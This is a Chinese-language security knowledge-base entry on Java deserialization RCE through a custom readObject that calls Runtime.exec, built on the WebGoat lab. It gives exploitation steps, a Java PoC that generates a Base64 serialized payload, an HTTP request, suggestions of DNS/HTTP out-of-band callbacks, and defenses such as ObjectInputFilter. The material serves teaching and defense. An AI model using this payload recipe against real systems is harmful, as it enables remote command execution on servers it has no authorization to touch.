---
id: web-java-deserialization-custom-readobject-runtime-exec
title: 接收任意 Serializable 对象且业务类 readObject 直接 Runtime.exec 导致反序列化 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: custom-readobject-runtime-exec-deserialization
aliases:
- readObject 命令执行
- VulnerableTaskHolder
- 反序列化入口
- Base64 序列化数据
- 自定义类 gadget
- ObjectInputStream RCE
tags:
- java
- deserialization
- readobject
- rce
- serializable
- base64
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T03:16:39+08:00'
  notes: 已对照原文2.7.1节核对：入口 Base64 解码→ObjectInputStream.readObject→instanceof 检查；VulnerableTaskHolder.readObject 先 defaultReadObject，检查 requestedExecutionTime 在近10分钟、taskAction 以 sleep/ping 开头且长度<22 后 Runtime.exec；构造 taskAction=sleep 5 的序列化 Base64 实测延时通关。原文未给组件版本（WebGoat 8.2.2 靶场），未设置 affected_versions。未复现。
---

## 一句话结论

接口把用户提交的 Base64 字符串直接交给 `ObjectInputStream.readObject()`，而应用自身的某个 `Serializable` 类在 `readObject()` 里用字段值执行 `Runtime.getRuntime().exec()`，攻击者可构造该类实例的序列化字节流，让反序列化在类型检查之前就执行命令。

## 原理

- Java 反序列化会在 `readObject()` 返回对象之前调用类自己的 `readObject(ObjectInputStream)` 方法。该方法里若存在 `Runtime.exec()`、`ProcessBuilder`、文件写入、JNDI 查找等副作用，就会在“对象被创建/校验”之前执行。
- 漏洞代码常见顺序：Base64 解码 → `new ObjectInputStream(bytes).readObject()` → 判断 `instanceof VulnerableTaskHolder` → 不是则报错。`instanceof` 写在 `readObject()` 之后，无法阻止已经发生的副作用。
- 该类的 `readObject()` 先用 `defaultReadObject()` 恢复 `taskName`、`taskAction` 等字段，再检查 `taskAction` 是否以 `sleep`/`ping` 开头且长度小于 22，满足就 `Runtime.exec(taskAction)`；有的实现还会检查 `requestedExecutionTime` 是否在最近 10 分钟内，绕过方式是构造时写入当前时间。
- 攻击者不需要第三方 gadget 链：只要能把目标类的字节码加载到自己的环境（同版本依赖/源码），构造同包名、同 serialVersionUID 的实例并序列化即可。字段值完全由攻击者控制。
- 根因是“把反序列化当作数据解析”，但反序列化本质上是对象重建，会执行类中定义的代码；类型白名单必须发生在反序列化之前（`ObjectInputFilter`/`resolveClass`），而不是之后。

## 触发条件

- 接口接受用户可控的序列化字节流（Base64、hex、二进制 body、Cookie、文件上传等）。
- 使用原生 `ObjectInputStream` 且没有 `ObjectInputFilter`/`resolveClass` 白名单。
- classpath 中存在 `readObject()` 带危险副作用的 `Serializable` 类（业务类或第三方类）。
- 危险方法的参数可由反序列化字段控制，且限制条件可满足（如命令前缀/长度/时间窗）。

## 利用步骤

1. 定位反序列化入口：搜索 `ObjectInputStream`、`readObject()`、`Base64.getDecoder()`、`XStream`、`Hessian` 等；确认输入是否用户可控。
2. 找到带 `readObject()` 的类，分析其中调用的危险方法与字段约束（命令前缀、长度、时间、类型）。
3. 在本地引入同版本类/依赖，构造满足约束的实例（如 `taskAction="sleep 5"`）。
4. 用 `ObjectOutputStream` 序列化并 Base64 编码。
5. 把 Base64 字符串提交到入口，观察命令执行副作用（延时、回连、文件落地）。
6. 若命令长度受限，用 `ping -c 1 <dnslog>`、`sleep 5`、下载器分段等方式验证；必要时用 DNS/HTTP 外带确认。

## PoC

```java
// 生成 payload（类需与目标同包名/同 serialVersionUID）
VulnerableTaskHolder task = new VulnerableTaskHolder("x", "sleep 5");
ByteArrayOutputStream baos = new ByteArrayOutputStream();
try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
    oos.writeObject(task);
}
String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
System.out.println(payload);
```

```http
POST /api/task HTTP/1.1
Host: target
Content-Type: application/json

{"task": "<上一步生成的 Base64>"}
```

```text
# 预期：服务端反序列化时执行 sleep 5，响应延迟约 5 秒；
# 将 taskAction 换成可外带/可验证的命令即可确认 RCE。
```

## 变体与关联

- 变体：`readObject()` 中调用 `Runtime.exec`、`ProcessBuilder`、`Files.write`、`InitialContext.lookup`（JNDI）、`Class.forName` 等，危害从 RCE 到任意文件写入/JNDI 注入。
- 变体：`readResolve()`、`readExternal()`、`validateObject()` 同样会在反序列化过程中执行。
- 变体：类型检查写在 `readObject()` 之后（本例），或用 `instanceof` 但类本身已执行副作用；正确做法是 `ObjectInputFilter` 在解析前拒绝非白名单类。
- 关联：[[web-java-deser-readobject-reflection-rmiconnector-secondary]]（readObject 中的反射/二次调用链）。
- 关联：[[web-java-deserialization-filter-rootchecked-first-class-bypass]]（反序列化过滤器白名单绕过）。
- 边界：若入口使用 `ObjectInputFilter` 白名单、只允许特定类，或业务类 `readObject()` 无危险副作用，该链不成立；JDK 高版本默认过滤器也会拦截部分类。

## 检测与防御

- 修复：禁止对不可信输入使用原生反序列化；改用 JSON/Protobuf 等数据格式。
- 修复：必须使用时，在 `ObjectInputStream` 上设置 `ObjectInputFilter`，只允许明确白名单类与字段；过滤必须在 `readObject` 前生效。
- 修复：业务类不要实现带副作用的 `readObject()`/`readResolve()`；危险操作与对象重建分离。
- 加固：升级 JDK 并使用 `jdk.serialFilter` 全局过滤器；限制反序列化入口的访问与大小；隔离进程权限。
- 检测：请求体出现 Java 序列化魔数 `AC ED 00 05`（Base64 `rO0AB`）、异常长的二进制/Base64 字段；`readObject` 相关类被加载；反序列化期间出现子进程创建、外连 DNS/HTTP。
